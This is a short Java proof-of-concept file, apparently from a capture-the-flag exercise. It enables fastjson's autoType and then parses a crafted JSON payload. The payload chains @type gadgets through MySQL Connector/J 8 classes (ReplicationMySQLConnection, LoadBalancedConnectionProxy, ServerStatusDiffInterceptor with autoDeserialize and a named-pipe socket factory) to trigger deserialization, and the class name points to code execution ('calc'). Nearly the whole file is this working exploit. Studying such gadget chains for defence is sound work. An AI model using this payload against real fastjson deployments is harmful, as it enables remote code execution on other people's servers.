package com.suctf;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Fastjson_mysql_calc_8 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String mysql8poc ="{\n" +
                "  \"x1\": {\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                "    \"proxy\": {\n" +
                "      \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                "      \"connectionUrl\": {\n" +
                "        \"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                "        \"masters\": [\n" +
                "          {}\n" +
                "        ],\n" +
                "        \"slaves\": [],\n" +
                "        \"properties\": {\n" +
                "          \"host\": \"xxx\",\n" +
                "          \"user\": \"mysql\",\n" +
                "          \"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "          \"autoDeserialize\": \"true\",\n" +
                "          \"socketFactory\": \"com.mysql.cj.protocol.NamedPipeSocketFactory\",\n" +
                "          \"path\": \"calc_8.txt\",\n" +
                "          \"maxAllowedPacket\": \"74996390\",\n" +
                "          \"dbname\": \"test\",\n" +
                "          \"useSSL\": \"false\"\n" +
                "        }\n" +
                "      }\n" +
                "    }\n" +
                "  }\n" +
                "}\n";
        JSON.parseObject(mysql8poc);
    }
}

